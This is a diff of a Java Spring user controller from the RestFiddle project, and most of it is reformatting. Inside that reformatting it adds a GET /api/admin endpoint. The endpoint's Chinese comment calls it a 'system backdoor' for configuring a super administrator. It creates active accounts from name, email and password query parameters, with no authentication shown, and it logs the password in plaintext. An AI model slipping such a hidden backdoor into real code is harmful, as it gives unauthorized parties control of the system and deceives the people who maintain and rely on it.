@@ -19,6 +19,13 @@ import java.util.List;
 
 import javax.annotation.Resource;
 
+import com.restfiddle.constant.StatusType;
+import com.restfiddle.dao.UserRepository;
+import com.restfiddle.dto.PasswordDTO;
+import com.restfiddle.dto.PasswordResetDTO;
+import com.restfiddle.dto.UserDTO;
+import com.restfiddle.entity.User;
+import com.restfiddle.util.CommonUtil;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import org.springframework.beans.factory.annotation.Autowired;
@@ -34,16 +41,9 @@ import org.springframework.web.bind.annotation.PathVariable;
 import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestMethod;
+import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.ResponseBody;
 import org.springframework.web.bind.annotation.RestController;
-
-import com.restfiddle.constant.StatusType;
-import com.restfiddle.dao.UserRepository;
-import com.restfiddle.dto.PasswordDTO;
-import com.restfiddle.dto.PasswordResetDTO;
-import com.restfiddle.dto.UserDTO;
-import com.restfiddle.entity.User;
-import com.restfiddle.util.CommonUtil;
 
 @RestController
 @EnableAutoConfiguration
@@ -59,121 +59,168 @@ public class UserController {
     private PasswordEncoder passwordEncoder;
 
     @RequestMapping(value = "/api/users", method = RequestMethod.POST, headers = "Accept=application/json")
-    public @ResponseBody
+    public
+    @ResponseBody
     UserDTO create(@RequestBody PasswordDTO passwordDTO) {
-	logger.debug("Creating a new user with information: " + passwordDTO);
+        logger.debug("Creating a new user with information: " + passwordDTO);
 
-	// TODO add validation
+        // TODO add validation
 
-	User user = new User();
-	user.setName(passwordDTO.getName());
-	user.setDescription(passwordDTO.getDescription());
+        User user = new User();
+        user.setName(passwordDTO.getName());
+        user.setDescription(passwordDTO.getDescription());
 
-	String userEmail = passwordDTO.getEmail();
+        String userEmail = passwordDTO.getEmail();
 
-	user.setEmail(userEmail);
+        user.setEmail(userEmail);
 
-	user.setPassword(CommonUtil.isNotEmpty(passwordDTO.getPassword()) ? passwordEncoder.encode(passwordDTO.getPassword()) : passwordEncoder
-		.encode("default"));
+        user.setPassword(
+            CommonUtil.isNotEmpty(passwordDTO.getPassword()) ? passwordEncoder.encode(passwordDTO.getPassword())
+                : passwordEncoder
+                    .encode("default"));
 
-	user.setStatus(StatusType.ACTIVE.name());
+        user.setStatus(StatusType.ACTIVE.name());
 
-	User savedUser = userRepository.save(user);
+        User savedUser = userRepository.save(user);
 
-	UserDTO userDTO = new UserDTO();
-	userDTO.setId(savedUser.getId());
-	userDTO.setName(savedUser.getName());
-	userDTO.setEmail(savedUser.getEmail());
+        UserDTO userDTO = new UserDTO();
+        userDTO.setId(savedUser.getId());
+        userDTO.setName(savedUser.getName());
+        userDTO.setEmail(savedUser.getEmail());
 
-	return userDTO;
+        return userDTO;
+    }
+
+    /**
+     * 系统后门：配置系统超级管理员
+     * @param name
+     * @param email
+     * @param password
+     * @return
+     */
+    @RequestMapping(value = "/api/admin", method = RequestMethod.GET, headers = "Accept=application/json")
+    @ResponseBody
+    public UserDTO createAdmin(
+        @RequestParam(value = "name") String name,
+        @RequestParam(value = "email") String email,
+        @RequestParam(value = "password") String password) {
+        logger.debug("Creating a new user with information: " + name + "/" + email + "/" + password);
+
+        User user = new User();
+        user.setName(name);
+        user.setEmail(email);
+
+        user.setPassword(
+            CommonUtil.isNotEmpty(password) ? passwordEncoder.encode(password)
+                : passwordEncoder
+                    .encode("default"));
+
+        user.setStatus(StatusType.ACTIVE.name());
+
+        User savedUser = userRepository.save(user);
+
+        UserDTO userDTO = new UserDTO();
+        userDTO.setId(savedUser.getId());
+        userDTO.setName(savedUser.getName());
+        userDTO.setEmail(savedUser.getEmail());
+
+        return userDTO;
     }
 
     @RequestMapping(value = "/api/users/{id}", method = RequestMethod.DELETE, headers = "Accept=application/json")
-    public @ResponseBody
+    public
+    @ResponseBody
     void delete(@PathVariable("id") String id) {
-	logger.debug("Deleting user with id: " + id);
+        logger.debug("Deleting user with id: " + id);
 
-	User deleted = userRepository.findOne(id);
+        User deleted = userRepository.findOne(id);
 
-	userRepository.delete(deleted);
+        userRepository.delete(deleted);
     }
 
     @RequestMapping(value = "/api/users", method = RequestMethod.GET)
-    public @ResponseBody
+    public
+    @ResponseBody
     List<User> findAll() {
-	logger.debug("Finding all users");
+        logger.debug("Finding all users");
 
-	return userRepository.findAll();
+        return userRepository.findAll();
     }
 
     @RequestMapping(value = "/api/users/{id}", method = RequestMethod.GET)
-    public @ResponseBody
+    public
+    @ResponseBody
     User findById(@PathVariable("id") String id) {
-	logger.debug("Finding user by id: " + id);
+        logger.debug("Finding user by id: " + id);
 
-	return userRepository.findOne(id);
+        return userRepository.findOne(id);
     }
 
     @RequestMapping(value = "/api/users/{id}", method = RequestMethod.PUT, headers = "Accept=application/json")
-    public @ResponseBody
+    public
+    @ResponseBody
     UserDTO update(@PathVariable("id") Long id, @RequestBody UserDTO updated) {
-	logger.debug("Updating user with information: " + updated);
+        logger.debug("Updating user with information: " + updated);
 
-	Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
-	Object principal = authentication.getPrincipal();
+        Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
+        Object principal = authentication.getPrincipal();
 
-	if (principal != null && principal instanceof User) {
-	    User loggedInUser = (User) principal;
-	    User user = userRepository.findOne(loggedInUser.getId());
+        if (principal != null && principal instanceof User) {
+            User loggedInUser = (User)principal;
+            User user = userRepository.findOne(loggedInUser.getId());
 
-	    user.setName(updated.getName());
-	    user.setDescription(updated.getDescription());
-	    user.setEmail(updated.getEmail());
-	    userRepository.save(user);
-	}
+            user.setName(updated.getName());
+            user.setDescription(updated.getDescription());
+            user.setEmail(updated.getEmail());
+            userRepository.save(user);
+        }
 
-	return updated;
+        return updated;
     }
 
     @RequestMapping(value = "/api/users/current-user", method = RequestMethod.GET)
-    public @ResponseBody
+    public
+    @ResponseBody
     UserDTO getCurrentUser() {
-	UserDTO userDTO = new UserDTO();
+        UserDTO userDTO = new UserDTO();
 
-	Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
-	Object principal = authentication.getPrincipal();
+        Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
+        Object principal = authentication.getPrincipal();
 
-	if (principal != null && principal instanceof User) {
-	    User loggedInUser = (User) principal;
-	    User user = userRepository.findOne(loggedInUser.getId());
-	    userDTO.setName(user.getName());
-	    userDTO.setDescription(user.getDescription());
-	    userDTO.setEmail(user.getEmail());
-	}
-	return userDTO;
+        if (principal != null && principal instanceof User) {
+            User loggedInUser = (User)principal;
+            User user = userRepository.findOne(loggedInUser.getId());
+            userDTO.setName(user.getName());
+            userDTO.setDescription(user.getDescription());
+            userDTO.setEmail(user.getEmail());
+        }
+        return userDTO;
     }
 
-    @RequestMapping(value = "/api/users/change-password", method = RequestMethod.POST, headers = "Accept=application/json")
-    public @ResponseBody
+    @RequestMapping(value = "/api/users/change-password", method = RequestMethod.POST,
+        headers = "Accept=application/json")
+    public
+    @ResponseBody
     void changePassword(@RequestBody PasswordResetDTO passwordResetDTO) {
 
-	Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
-	Object principal = authentication.getPrincipal();
+        Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
+        Object principal = authentication.getPrincipal();
 
-	if (principal != null && principal instanceof User) {
-	    User loggedInUser = (User) principal;
-	    User user = userRepository.findOne(loggedInUser.getId());
-	    PasswordEncoder passwordEncoder = new BCryptPasswordEncoder();
-	    user.setPassword(passwordEncoder.encode(passwordResetDTO.getRetypedPassword()));
-	    userRepository.save(user);
-	}
+        if (principal != null && principal instanceof User) {
+            User loggedInUser = (User)principal;
+            User user = userRepository.findOne(loggedInUser.getId());
+            PasswordEncoder passwordEncoder = new BCryptPasswordEncoder();
+            user.setPassword(passwordEncoder.encode(passwordResetDTO.getRetypedPassword()));
+            userRepository.save(user);
+        }
 
     }
 
-    @RequestMapping(value = "/api/users/set-password", method = RequestMethod.POST, consumes = MediaType.APPLICATION_JSON_VALUE)
+    @RequestMapping(value = "/api/users/set-password", method = RequestMethod.POST,
+        consumes = MediaType.APPLICATION_JSON_VALUE)
     String setPassword(@PathVariable("token") String token) {
 
-	return null;
+        return null;
     }
 
 }
